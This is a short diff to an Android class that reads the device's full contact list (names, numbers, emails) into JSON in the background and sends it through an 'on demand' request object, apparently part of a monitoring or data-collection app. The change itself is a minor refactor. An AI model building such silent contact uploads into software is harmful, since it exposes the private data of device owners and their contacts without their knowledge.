@@ -13,11 +13,12 @@ import android.os.AsyncTask;
 import android.provider.ContactsContract;
 
 import com.inet.android.request.DataRequest;
+import com.inet.android.request.OnDemandRequest;
 import com.inet.android.utils.Logging;
 
 public class GetContacts extends AsyncTask<Context, Void, Void> {
 	Context mContext;
-	private String type = "9";
+	private int type = 6;
 
 	ArrayList<String> email = null;
 	ArrayList<String> emailType = null;
@@ -194,7 +195,6 @@ public class GetContacts extends AsyncTask<Context, Void, Void> {
 				}
 //				JSONObject object = new JSONObject();
 
-				jsonObject.put("type", type);
 				if (!jsonName.isNull("name"))
 					jsonInfo.put("name", jsonName);
 				jsonInfo.put("number", jsonPhoneType);
@@ -207,7 +207,7 @@ public class GetContacts extends AsyncTask<Context, Void, Void> {
 				sendJSONStr = jsonObject.toString();
 			}
 			if (jsonAllContact != null) {
-				DataRequest dr = new DataRequest(mContext);
+				OnDemandRequest dr = new OnDemandRequest(mContext, type);
 				dr.sendRequest(jsonObject.toString());
 				Logging.doLog(LOG_TAG, sendJSONStr,
 						sendJSONStr);
